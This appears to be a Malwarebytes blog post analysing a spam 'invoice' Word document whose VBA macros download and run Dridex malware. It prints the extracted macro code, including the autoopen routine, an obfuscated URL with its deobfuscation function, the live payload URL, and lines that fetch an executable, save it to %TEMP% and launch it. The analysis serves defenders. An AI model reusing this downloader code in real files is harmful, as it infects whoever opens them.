@@ -1,0 +1,127 @@
+Beware of DOC! A look at malicious macros
+Some malware families often use spam campaigns as a method of distribution. Usually they deploy simple social engineering tricks – trying to deliver packed executable in disguise of a document, i.e. PDF (as we mentioned before).
+Such trick may fool some users – however, more advanced of them will notice that the real extension of the file is .exe – means, it is an executable, not a document as it claims. But even if it was a real document, it doesn’t mean that it is harmless.
+In this post we will reveal the true mission of a DOC file delivered in a spam.
+Analyzed sample
+(523)-Invoice 7500005791.doc – md5: 370751889f591000daa40c400d0611f2
+Extracting macros
+I will use oledump  – a very handy tool for dissecting DOCs, written by Didier Stevens.
+First, let’s have a look on what are the elements inside the doc:
+./oledump.py “(523)-Invoice 7500005791.doc”
+
+1:      114 '\x01CompObj'
+2:     4096 '\x05DocumentSummaryInformation'
+3:     4096 '\x05SummaryInformation'
+4:    10158 '1Table'
+5:      513 'Macros/PROJECT'
+6:      113 'Macros/PROJECTwm'
+7: M   7807 'Macros/VBA/Module1'
+8: M  18990 'Macros/VBA/Module2'
+9: M  15739 'Macros/VBA/Module3'
+10: M   1475 'Macros/VBA/ThisDocument'
+11:     7123 'Macros/VBA/_VBA_PROJECT'
+12:      617 'Macros/VBA/dir'
+13:     4096 'WordDocument'
+
+As we can see above, the file comes with 4 VB modules (streams: 7,8,9,10). This is the point, where we can expect some illegitimate functionalities – macros can potentially deploy malicious actions. Let’s take a closer look.
+We can easily extract the code with the help of the same tool.
+./oledump.py -s <stream number> -v <file>
+Let’s fetch all of them:
+./oledump.py -s 7 -v “(523)-Invoice 7500005791.doc” > Module1.vb
+./oledump.py -s 8 -v “(523)-Invoice 7500005791.doc” > Module2.vb
+./oledump.py -s 9 -v “(523)-Invoice 7500005791.doc” > Module3.vb
+./oledump.py -s 10 -v “(523)-Invoice 7500005791.doc” > ThisDocument.vb
+
+Analyzing macros
+Execution of macros starts in ThisDocument.vb
+
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+
+Sub autoopen()
+UserRetiraItem 0, 0, -5
+BroadCastParty 0, ""
+SendBanObj 0, 0, ""
+DarCuerpoDesnudo 0, False
+IniciarDeposito 0
+Bloquear False, 0, 0, 0, False
+HayLava -1, -1, -1
+End Sub
+
+The procedure autoopen deploys several functions, that can be found in other VB modules.
+Inside another file there are several public objects, that are used to share information between them:
+
+Public halalaya As Object
+Public adbrd As Object
+Public processEnv  As Object
+
+Public tempFile As String
+Public shellApp As Object
+
+The object named halalaya will be used to handle HTTP communication.
+The function SendBanObj generates some GET request:
+
+Public Sub SendBanObj(UserIndex As Integer, Slot As Byte, Object As String)
+
+Set shellApp = CreateObject("Shell.Application")
+'***************************************************
+'Author: Unknownn
+'Last Modification: -
+'
+'***************************************************
+adbrd.Type = 1
+Dim Professor() As Variant
+Professor = Array(148, 158, 156, 150, 94, 81, 79, 149, 147, 145, 70, 137, 128, 115, 131, 125, 114, 126, 54, 105, 115, 48, 117, 105, 43, 47, 46, 42, 43, 39, 40, 36, 33, 25, 81, 78, 27, 24, 68, 68, 78, 8, 61, 78, 57)
+halalaya.Open "GET", GetStringFromArray(Professor, 44), False
+Exit Sub
+Us.rList(Use.rIndex).BancoInvent.Object(Slot) = Object
+
+Call Writ.eChangeBankSlot(UserI.ndex, Slot)
+
+End Sub
+
+The link where the GET request refers is not readable. Fortunately, the deobfuscating procedure can be easily found in another module:
+
+Public Function GetStringFromArray(fromArr() As Variant, LenLen As Integer) As String
+Dim i As Integer
+Dim result As String
+result = ""
+For i = LBound(fromArr) To UBound(fromArr)
+result = result & Chr(fromArr(i) - LenLen + i * 2)
+Next i
+GetStringFromArray = result
+End Function
+
+As a result of executing the function on the array we get the link, from where the payload will be fetched:
+http://www.slasoft.co.uk/56475865/ih76dfr.exe
+The response is saved into the temporary file and deployed:
+
+adbrd.write halalaya.responseBody
+adbrd.savetofile tempFile, 2
+shellApp.Open (tempFile)
+End Function
+
+Creating name of the temporary file:
+
+tempFile = processEnv("T" & "EMP")
+
+If ToMap Then
+Call Sen.dData(SendTarget.ToMap, sndIndex, Prepar.eMessageBlockPosition(X, Y, b))
+Call Writ.eBlockPosition(sndIndex, X, Y, b)
+End If
+
+tempFile = tempFile + "\" & "Hich" & "Az2" + "." +"e" + "xe"
+End Sub
+
+So, as we can see the result is saved into: HichAz2.exe in the %TEMP% directory.
+Conclusion
+The simple analysis have proven, that the delivered file is not a real invoice, but a downloader. It fetches executable from the hardcoded link, saves it in the TEMP folder and deploys.
+The downloaded file turned out to be a sample of Dridex malware – md5: 7f0076993f2d8a4629ea7b0df5b9bddd
+Users of Malwarebytes Anti-Malware are safe from this Dridex variant as it is detected as Trojan.Sharik.
+However, users of Malwarebytes Anti-Exploit premium are protected from the actual malicious Word document as the file is blocked before it manage to deploy its malicious functions:
